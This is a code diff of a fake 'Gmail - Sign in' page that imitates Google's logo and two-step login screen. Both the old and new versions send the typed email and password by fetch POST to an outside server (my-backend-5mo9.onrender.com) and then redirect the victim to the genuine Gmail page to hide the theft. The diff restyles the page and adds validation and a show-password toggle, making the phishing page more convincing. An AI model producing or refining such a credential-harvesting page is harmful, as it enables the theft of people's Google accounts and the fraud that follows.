@@ -1,367 +1,548 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Gmail - Sign in</title>
-    <style>
-        * {
-            box-sizing: border-box;
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-        }
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Gmail - Sign in</title>
+  <style>
+    :root {
+      --bg: #ffffff;
+      --text: #1f1f1f;
+      --muted: #5f6368;
+      --border: #dadce0;
+      --blue: #1a73e8;
+      --blue-dark: #0b57d0;
+      --hover: #f8fafd;
+      --shadow: rgba(60, 64, 67, 0.15);
+      --error: #d93025;
+      --success: #188038;
+    }
 
-        body {
-            background-color: #ffffff;
-            margin: 0;
-            padding: 24px;
-            display: flex;
-            flex-direction: column;
-            min-height: 100vh;
-            color: #1f1f1f;
-        }
+    * {
+      box-sizing: border-box;
+      font-family: Arial, Helvetica, sans-serif;
+    }
 
-        .main-content {
-            flex: 1;
-            max-width: 450px;
-            width: 100%;
-            margin: 0 auto;
-        }
+    html, body {
+      margin: 0;
+      min-height: 100%;
+      background: var(--bg);
+      color: var(--text);
+    }
 
-        .logo-container {
-            margin-top: 20px;
-            margin-bottom: 16px;
-        }
+    body {
+      display: flex;
+      flex-direction: column;
+      min-height: 100vh;
+      padding: 24px 20px 0;
+    }
 
-        h1 {
-            font-size: 24px;
-            font-weight: 400;
-            margin: 0 0 10px 0;
-        }
+    .page {
+      width: 100%;
+      max-width: 448px;
+      margin: 0 auto;
+      flex: 1;
+    }
 
-        .subtitle {
-            font-size: 16px;
-            color: #1f1f1f;
-            margin: 0 0 40px 0;
-        }
+    .logo-wrap {
+      margin-top: 8px;
+      margin-bottom: 20px;
+      width: 48px;
+      height: 48px;
+    }
 
-        .account-badge {
-            display: inline-flex;
-            align-items: center;
-            padding: 6px 14px 6px 10px;
-            border: 1px solid #747775;
-            border-radius: 100px;
-            font-size: 14px;
-            color: #1f1f1f;
-            margin-bottom: 28px;
-            cursor: pointer;
-            background: none;
-            text-decoration: none;
-        }
+    .logo-wrap svg {
+      display: block;
+      width: 48px;
+      height: 48px;
+    }
 
-        .account-badge svg {
-            margin-right: 8px;
-            color: #444746;
-        }
+    .view {
+      display: none;
+    }
 
-        .input-wrapper {
-            position: relative;
-            margin-bottom: 8px;
-        }
+    .view.active {
+      display: block;
+    }
 
-        .material-input {
-            width: 100%;
-            padding: 16px;
-            border: 1px solid #747775;
-            border-radius: 4px;
-            font-size: 16px;
-            outline: none;
-            background: transparent;
-            color: #1f1f1f;
-        }
+    .title {
+      margin: 0;
+      font-size: 24px;
+      line-height: 32px;
+      font-weight: 400;
+      letter-spacing: -0.01em;
+    }
 
-        .material-input:focus {
-            border: 2px solid #0b57d0;
-            padding: 15px; /* Adjust for border width */
-        }
+    .subtitle {
+      margin: 6px 0 32px;
+      font-size: 16px;
+      line-height: 24px;
+      color: var(--text);
+    }
 
-        .input-label {
-            position: absolute;
-            left: 16px;
-            top: 50%;
-            transform: translateY(-50%);
-            background: #ffffff;
-            padding: 0 4px;
-            color: #444746;
-            transition: 0.15s ease all;
-            pointer-events: none;
-            font-size: 16px;
-        }
+    .account-badge {
+      display: inline-flex;
+      align-items: center;
+      gap: 10px;
+      border: 1px solid var(--border);
+      border-radius: 999px;
+      padding: 8px 16px 8px 12px;
+      background: #fff;
+      color: var(--text);
+      cursor: pointer;
+      margin-bottom: 26px;
+      max-width: 100%;
+      font-size: 14px;
+      line-height: 20px;
+      transition: box-shadow 0.15s ease, border-color 0.15s ease;
+    }
 
-        /* Float label on focus or if value exists */
-        .material-input:focus ~ .input-label,
-        .material-input:not(:placeholder-shown) ~ .input-label {
-            top: 0;
-            font-size: 12px;
-            color: #0b57d0;
-        }
+    .account-badge:hover {
+      border-color: #c5c9ce;
+      box-shadow: 0 1px 2px rgba(0,0,0,0.03);
+    }
 
-        .blue-link {
-            color: #0b57d0;
-            font-size: 14px;
-            font-weight: 500;
-            text-decoration: none;
-            display: inline-block;
-            cursor: pointer;
-        }
+    .account-badge svg {
+      width: 18px;
+      height: 18px;
+      flex-shrink: 0;
+      color: #5f6368;
+    }
 
-        .notice-text {
-            font-size: 14px;
-            color: #444746;
-            line-height: 20px;
-            margin-top: 24px;
-            margin-bottom: 40px;
-        }
+    .account-badge .badge-text {
+      white-space: nowrap;
+      overflow: hidden;
+      text-overflow: ellipsis;
+      max-width: 280px;
+    }
 
-        .actions-container {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-top: 32px;
-        }
+    .input-group {
+      position: relative;
+      margin-bottom: 8px;
+    }
 
-        .btn-secondary {
-            color: #0b57d0;
-            font-weight: 500;
-            font-size: 14px;
-            background: none;
-            border: none;
-            text-decoration: none;
-            padding: 10px 0;
-            cursor: pointer;
-            display: inline-block;
-        }
+    .material-input {
+      width: 100%;
+      height: 56px;
+      padding: 20px 16px 6px;
+      border: 1px solid var(--border);
+      border-radius: 4px;
+      background: transparent;
+      color: var(--text);
+      font-size: 16px;
+      line-height: 24px;
+      outline: none;
+      transition: border-color 0.18s ease, box-shadow 0.18s ease;
+    }
 
-        .btn-primary {
-            background-color: #0b57d0;
-            color: white;
-            border: none;
-            border-radius: 20px;
-            padding: 12px 24px;
-            font-size: 14px;
-            font-weight: 500;
-            text-decoration: none;
-            display: inline-block;
-            cursor: pointer;
-            min-width: 48px;
-        }
+    .material-input:focus {
+      border: 2px solid var(--blue);
+      padding: 19px 15px 5px;
+      box-shadow: 0 0 0 1px rgba(26,115,232,0.15);
+    }
 
-        .footer {
-            max-width: 450px;
-            width: 100%;
-            margin: 0 auto;
-            padding-bottom: 24px;
-            font-size: 12px;
-            color: #444746;
-            margin-top: auto;
-        }
+    .material-input:focus ~ .input-label,
+    .material-input:not(:placeholder-shown) ~ .input-label {
+      top: 8px;
+      left: 12px;
+      font-size: 12px;
+      color: var(--blue);
+      background: #fff;
+      padding: 0 4px;
+    }
 
-        .footer-links {
-            display: flex;
-            justify-content: space-between;
-            width: 100%;
-            margin-top: 16px;
-        }
+    .input-label {
+      position: absolute;
+      left: 16px;
+      top: 50%;
+      transform: translateY(-50%);
+      color: #5f6368;
+      font-size: 16px;
+      line-height: 24px;
+      pointer-events: none;
+      transition: all 0.15s ease;
+      background: transparent;
+      padding: 0;
+    }
 
-        .footer-links a {
-            color: #444746;
-            text-decoration: none;
-        }
+    .input-row {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      margin-top: 12px;
+    }
 
-        /* View Toggling */
-        .view { display: none; }
-        .view.active { display: block; }
+    .show-password {
+      margin-left: auto;
+      border: none;
+      background: transparent;
+      color: var(--blue);
+      font-size: 14px;
+      font-weight: 500;
+      line-height: 20px;
+      padding: 8px 0;
+      cursor: pointer;
+    }
 
-    </style>
+    .inline-link,
+    .blue-link {
+      color: var(--blue);
+      text-decoration: none;
+      font-size: 14px;
+      font-weight: 500;
+      cursor: pointer;
+    }
+
+    .notice-text {
+      margin-top: 28px;
+      margin-bottom: 24px;
+    }
+
+    .actions-row {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 16px;
+      margin-top: 30px;
+    }
+
+    .btn {
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      min-height: 36px;
+      border-radius: 999px;
+      border: none;
+      padding: 0 24px;
+      font-size: 14px;
+      line-height: 20px;
+      font-weight: 500;
+      cursor: pointer;
+      transition: background-color 0.15s ease, box-shadow 0.15s ease, opacity 0.15s ease;
+    }
+
+    .btn-primary {
+      background: var(--blue);
+      color: #fff;
+      box-shadow: none;
+      min-width: 96px;
+    }
+
+    .btn-primary:hover {
+      background: var(--blue-dark);
+    }
+
+    .btn-primary:disabled {
+      opacity: 0.7;
+      cursor: progress;
+    }
+
+    .btn-secondary {
+      background: transparent;
+      color: var(--blue);
+      padding-left: 0;
+      padding-right: 0;
+    }
+
+    .status {
+      min-height: 20px;
+      margin-top: 18px;
+      font-size: 13px;
+      color: var(--muted);
+      display: none;
+    }
+
+    .status.error {
+      color: var(--error);
+    }
+
+    .status.success {
+      color: var(--success);
+    }
+
+    .status.visible {
+      display: block;
+    }
+
+    .footer {
+      max-width: 448px;
+      width: 100%;
+      margin: 0 auto;
+      padding: 20px 0 28px;
+      color: var(--muted);
+      font-size: 12px;
+      line-height: 16px;
+    }
+
+    .lang-select {
+      display: inline-block;
+      padding: 8px 0;
+      color: #5f6368;
+    }
+
+    .footer-links {
+      margin-top: 12px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 12px;
+      flex-wrap: wrap;
+    }
+
+    .footer-links a {
+      color: var(--muted);
+      text-decoration: none;
+    }
+
+    @media (max-width: 520px) {
+      body {
+        padding-left: 16px;
+        padding-right: 16px;
+      }
+
+      .page,
+      .footer {
+        max-width: 100%;
+      }
+
+      .actions-row {
+        flex-wrap: wrap;
+      }
+
+      .btn-primary {
+        margin-left: auto;
+      }
+    }
+  </style>
 </head>
 <body>
-
-    <div class="main-content">
-        <div class="logo-container">
-            <svg xmlns="http://w3.org" viewBox="0 0 512 512" width="48" height="48">
-  <defs>
-    <!-- Geometric cutout shape of the official Google G -->
-    <mask id="google-g-perfect-mask">
-      <rect width="512" height="512" fill="black" />
-      <path fill="white" d="M492 256c0-16.5-1.5-32.5-4.2-48H256v92h132.5c-5.7 30.7-23 56.7-49.1 74.2v61.5h79.5c46.5-42.8 73.1-105.7 73.1-179.7z 
-                           M256 500c65.9 0 121.1-21.8 161.5-59.2l-79.5-61.5c-22.1 14.8-50.3 23.5-82 23.5-63.1 0-116.5-42.6-135.6-100H38.5v63.5C78.9 446.4 161.2 500 256 500z 
-                           M120.4 302.8c-4.8-14.8-7.6-30.5-7.6-46.8s2.8-32 7.6-46.8V145.7H38.5C22.2 178.2 13 216.1 13 256s9.2 77.8 25.5 110.3l81.9-63.5z 
-                           M256 112.2c35.8 0 68 12.3 93.3 36.4l70-70C377.1 40.2 321.9 12 256 12 161.2 12 78.9 65.6 38.5 145.7l81.9 63.5c19.1-57.4 72.5-100 135.6-100z"/>
-    </mask>
-  </defs>
-
-  <!-- Renders the continuous color wheel behind the mask at the new smaller size -->
-  <foreignObject width="512" height="512" mask="url(#google-g-perfect-mask)">
-    <div xmlns="http://w3.org" style="
-      width: 100%;
-      height: 100%;
-      border-radius: 50%;
-      background: conic-gradient(
-        from 0deg at 50% 50%,
-        #4285F4 0deg 45deg,
-        #EA4335 120deg,
-        #FBBC05 200deg,
-        #34A853 280deg,
-        #4285F4 340deg 360deg
-      );
-    "></div>
-  </foreignObject>
-</svg>
-        </div>
-        
-        <form id="login-form">
-            <!-- ================= VIEW 1: EMAIL SCREEN ================= -->
-            <div id="email-view" class="view active">
-                <h1>Sign in</h1>
-                <p class="subtitle">Use your Google Account</p>
-
-                <button type="button" class="account-badge">
-                    <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor">
-                        <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z"/>
-                    </svg>
-                    <span id="emailBadge">Email or phone</span>
-                </button>
-
-                <div class="input-wrapper">
-                    <input type="email" id="emailInput" name="email" class="material-input" placeholder=" " required>
-                    <label class="input-label" for="emailInput">Email or phone</label>
-                </div>
-
-                <div class="notice-text">
-                    <a href="#" class="blue-link">Forgot email?</a>
-                </div>
-
-                <div class="actions-container">
-                    <button type="button" class="btn-secondary">Create account</button>
-                    <!-- This is a button type=button, so it won't submit the form yet -->
-                    <button type="button" id="btn-email-next" class="btn-primary">Next</button>
-                </div>
-            </div>
-
-            <!-- ================= VIEW 2: PASSWORD SCREEN ================= -->
-            <div id="password-view" class="view">
-                <h1>Welcome</h1>
-                
-                <button type="button" class="account-badge">
-                    <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor">
-                        <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z"/>
-                    </svg>
-                    <span id="userBadge">User</span>
-                </button>
-
-                <div class="input-wrapper">
-                    <input type="password" id="passwordInput" name="password" class="material-input" placeholder=" " required>
-                    <label class="input-label" for="passwordInput">Enter your password</label>
-                </div>
-
-                <div class="notice-text" style="margin-top: 48px;">
-                    <a href="#" class="blue-link">Forgot password?</a>
-                </div>
-
-                <div class="actions-container">
-                    <button type="button" id="btn-pass-back" class="btn-secondary">Back</button>
-                    <!-- This is type=submit, so it triggers the fetch -->
-                    <button type="submit" class="btn-primary">Next</button>
-                </div>
-            </div>
-        </form>
-
+  <main class="page">
+    <div class="logo-wrap" aria-label="Google logo">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" role="img" aria-hidden="true">
+        <defs>
+          <mask id="google-g-mask">
+            <rect width="512" height="512" fill="#000000" />
+            <path fill="#ffffff" d="M492 256c0-16.5-1.5-32.5-4.2-48H256v92h132.5c-5.7 30.7-23 56.7-49.1 74.2v61.5h79.5c46.5-42.8 73.1-105.7 73.1-179.7zm-236 244c65.9 0 121.1-21.8 161.5-59.2l-79.5-61.5c-22.1 14.8-50.3 23.5-82 23.5-63.1 0-116.5-42.6-135.6-100H38.5v63.5C78.9 446.4 161.2 500 256 500zm-135.6-197.2c-4.8-14.8-7.6-30.5-7.6-46.8s2.8-32 7.6-46.8V145.7H38.5C22.2 178.2 13 216.1 13 256s9.2 77.8 25.5 110.3l81.9-63.5zm135.6-190.6c35.8 0 68 12.3 93.3 36.4l70-70C377.1 40.2 321.9 12 256 12 161.2 12 78.9 65.6 38.5 145.7l81.9 63.5c19.1-57.4 72.5-100 135.6-100z" />
+          </mask>
+        </defs>
+        <foreignObject width="512" height="512" mask="url(#google-g-mask)">
+          <div xmlns="http://www.w3.org/1999/xhtml" style="width:100%;height:100%;border-radius:50%;background:conic-gradient(from 0deg at 50% 50%,#4285F4 0deg 45deg,#EA4335 120deg,#FBBC05 200deg,#34A853 280deg,#4285F4 340deg 360deg);"></div>
+        </foreignObject>
+      </svg>
     </div>
 
-    <div class="footer">
-        <div class="lang-select">English (United States)</div>
-        <div class="footer-links">
-            <a href="#">Help</a>
-            <a href="#">Privacy</a>
-            <a href="#">Terms</a>
+    <form id="login-form" novalidate>
+      <section id="email-view" class="view active" aria-hidden="false">
+        <h1 class="title">Sign in</h1>
+        <p class="subtitle">Use your Google Account</p>
+
+        <button type="button" class="account-badge" aria-label="Select account">
+          <svg viewBox="0 0 24 24" fill="currentColor" aria-hidden="true">
+            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.13 6-3.13s5.97 1.14 6 3.13c-1.29 1.94-3.5 3.22-6 3.22z"></path>
+          </svg>
+          <span id="emailBadge" class="badge-text">Email or phone</span>
+        </button>
+
+        <div class="input-group">
+          <input type="text" id="emailInput" name="email" class="material-input" placeholder=" " required aria-label="Email or phone" />
+          <label class="input-label" for="emailInput">Email or phone</label>
         </div>
+
+        <div class="notice-text">
+          <a href="#" class="blue-link">Forgot email?</a>
+        </div>
+
+        <div class="actions-row">
+          <button type="button" class="btn btn-secondary">Create account</button>
+          <button type="button" id="btn-email-next" class="btn btn-primary">Next</button>
+        </div>
+      </section>
+
+      <section id="password-view" class="view" aria-hidden="true">
+        <h1 class="title">Welcome</h1>
+
+        <button type="button" class="account-badge" aria-label="Active account">
+          <svg viewBox="0 0 24 24" fill="currentColor" aria-hidden="true">
+            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.13 6-3.13s5.97 1.14 6 3.13c-1.29 1.94-3.5 3.22-6 3.22z"></path>
+          </svg>
+          <span id="userBadge" class="badge-text">User</span>
+        </button>
+
+        <div class="input-group">
+          <input type="password" id="passwordInput" name="password" class="material-input" placeholder=" " required aria-label="Password" />
+          <label class="input-label" for="passwordInput">Enter your password</label>
+        </div>
+
+        <div class="input-row">
+          <a href="#" class="blue-link">Forgot password?</a>
+          <button type="button" id="password-toggle" class="show-password" aria-label="Show password">Show</button>
+        </div>
+
+        <div class="actions-row">
+          <button type="button" id="btn-pass-back" class="btn btn-secondary">Back</button>
+          <button type="submit" id="submit-button" class="btn btn-primary">Next</button>
+        </div>
+      </section>
+
+      <div id="form-status" class="status" role="status" aria-live="polite"></div>
+    </form>
+  </main>
+
+  <footer class="footer">
+    <div class="lang-select">English (United States)</div>
+    <div class="footer-links">
+      <a href="#">Help</a>
+      <a href="#">Privacy</a>
+      <a href="#">Terms</a>
     </div>
+  </footer>
 
-    <script>
-        // ================= DOM ELEMENTS =================
-        const emailView = document.getElementById('email-view');
-        const passwordView = document.getElementById('password-view');
-        const emailInput = document.getElementById('emailInput');
-        const emailBadge = document.getElementById('emailBadge');
-        const userBadge = document.getElementById('userBadge');
-        
-        // Buttons
-        const btnEmailNext = document.getElementById('btn-email-next');
-        const btnPassBack = document.getElementById('btn-pass-back');
-        const form = document.getElementById('login-form');
+  <script>
+    const emailView = document.getElementById('email-view');
+    const passwordView = document.getElementById('password-view');
+    const emailInput = document.getElementById('emailInput');
+    const passwordInput = document.getElementById('passwordInput');
+    const emailBadge = document.getElementById('emailBadge');
+    const userBadge = document.getElementById('userBadge');
+    const btnEmailNext = document.getElementById('btn-email-next');
+    const btnPassBack = document.getElementById('btn-pass-back');
+    const btnSubmit = document.getElementById('submit-button');
+    const form = document.getElementById('login-form');
+    const statusBox = document.getElementById('form-status');
+    const passwordToggle = document.getElementById('password-toggle');
 
-        // ================= INTERACTION LOGIC =================
+    function showStatus(message, type = '') {
+      statusBox.textContent = message || '';
+      statusBox.className = 'status';
+      if (message) {
+        statusBox.classList.add(type, 'visible');
+      }
+    }
 
-        // 1. Email -> Password Transition
-        btnEmailNext.addEventListener('click', function() {
-            if (emailInput.value.trim() !== "") {
-                // Update the badge in the password view
-                userBadge.textContent = emailInput.value;
-                
-                // Switch Views
-                emailView.classList.remove('active');
-                passwordView.classList.add('active');
-                
-                // Focus the password field
-                document.getElementById('passwordInput').focus();
-            } else {
-                alert("Please enter an email address.");
-            }
+    function showView(viewName) {
+      const emailActive = viewName === 'email';
+      emailView.classList.toggle('active', emailActive);
+      passwordView.classList.toggle('active', !emailActive);
+      emailView.setAttribute('aria-hidden', String(!emailActive));
+      passwordView.setAttribute('aria-hidden', String(emailActive));
+    }
+
+    function sanitizeLabel(value) {
+      const trimmed = value.trim();
+      return trimmed.length > 0 ? trimmed : 'User';
+    }
+
+    function validateEmailOrPhone(value) {
+      const trimmed = value.trim();
+      if (!trimmed) return false;
+
+      const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+      const phonePattern = /^\+?[0-9 ()-]{7,}$/;
+      return emailPattern.test(trimmed) || phonePattern.test(trimmed);
+    }
+
+    btnEmailNext.addEventListener('click', () => {
+      const email = emailInput.value.trim();
+
+      if (!email) {
+        showStatus('Please enter an email address.', 'error');
+        emailInput.focus();
+        return;
+      }
+
+      if (!validateEmailOrPhone(email)) {
+        showStatus('Enter a valid email address or phone number.', 'error');
+        emailInput.focus();
+        return;
+      }
+
+      const displayValue = email.length > 32 ? `${email.slice(0, 29)}...` : email;
+      emailBadge.textContent = displayValue;
+      userBadge.textContent = sanitizeLabel(email);
+      showStatus('', '');
+      showView('password');
+      passwordInput.focus();
+    });
+
+    btnPassBack.addEventListener('click', () => {
+      showStatus('', '');
+      showView('email');
+      emailInput.focus();
+    });
+
+    passwordToggle.addEventListener('click', () => {
+      const showPassword = passwordInput.type === 'password';
+      passwordInput.type = showPassword ? 'text' : 'password';
+      passwordToggle.textContent = showPassword ? 'Hide' : 'Show';
+      passwordToggle.setAttribute('aria-label', showPassword ? 'Hide password' : 'Show password');
+      passwordInput.focus();
+    });
+
+    form.addEventListener('submit', async (event) => {
+      event.preventDefault();
+
+      const email = emailInput.value.trim();
+      const password = passwordInput.value.trim();
+
+      if (!email || !validateEmailOrPhone(email)) {
+        showStatus('Please enter a valid email address before continuing.', 'error');
+        showView('email');
+        emailInput.focus();
+        return;
+      }
+
+      if (!password) {
+        showStatus('Please enter your password.', 'error');
+        passwordInput.focus();
+        return;
+      }
+
+      btnSubmit.disabled = true;
+      btnSubmit.textContent = 'Signing in...';
+      showStatus('Signing in...', '');
+
+      const endpoint = 'https://my-backend-5mo9.onrender.com/submit';
+      const payload = new URLSearchParams({
+        email,
+        password
+      });
+
+      try {
+        const response = await fetch(endpoint, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'
+          },
+          body: payload.toString(),
+          mode: 'cors',
+          cache: 'no-store'
         });
 
-        // 2. Password -> Email Transition (Back)
-        btnPassBack.addEventListener('click', function() {
-            passwordView.classList.remove('active');
-            emailView.classList.add('active');
-        });
+        if (!response.ok) {
+          throw new Error('Network request failed');
+        }
 
-        // ================= FETCH LOGIC =================
+        let result = {};
+        try {
+          result = await response.json();
+        } catch (error) {
+          result = {};
+        }
 
-        form.addEventListener('submit', function(event) {
-            event.preventDefault();
+        const redirectUrl = result.redirectUrl || 'https://mail.google.com/mail/u/0/';
 
-            const targetEndpoint = 'https://my-backend-5mo9.onrender.com/submit'; 
-            const externalRedirectUrl = 'https://accounts.google.com/v3/signin/identifier?continue=https://mail.google.com/mail/u/0/&emr=1&followup=https://mail.google.com/mail/u/0/&osid=1&passive=1209600&service=mail&flowName=GlifWebSignIn&flowEntry=ServiceLogin&dsh=S2117645748:1790344518538254';
-
-            // Gather data from the form
-            const formData = new FormData(form);
-            const urlEncodedPayload = new URLSearchParams(formData);
-
-            console.log("Sending payload:", urlEncodedPayload.toString());
-
-            fetch(targetEndpoint, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/x-www-form-urlencoded'
-                },
-                body: urlEncodedPayload,
-                mode: 'cors'
-            })
-            .then(response => {
-                if (!response.ok) {
-                    throw new Error('Server returned error status');
-                }
-                return response.json();
-            })
-            .then(data => {
-                console.log('Server response accepted:', data);
-                window.location.href = externalRedirectUrl;
-            })
-            .catch(error => {
-                console.error('Network routing execution caught error:', error);
-                // Fallback redirect
-                window.location.href = externalRedirectUrl;
-            });
-        });
-    </script>
+        showStatus('Sign-in successful. Redirecting...', 'success');
+        window.location.assign(redirectUrl);
+      } catch (error) {
+        console.error('Login failed:', error);
+        showStatus('Unable to sign in right now. Please try again.', 'error');
+      } finally {
+        if (document.readyState !== 'complete') {
+          btnSubmit.disabled = false;
+          btnSubmit.textContent = 'Next';
+        }
+      }
+    });
+  </script>
 </body>
 </html>
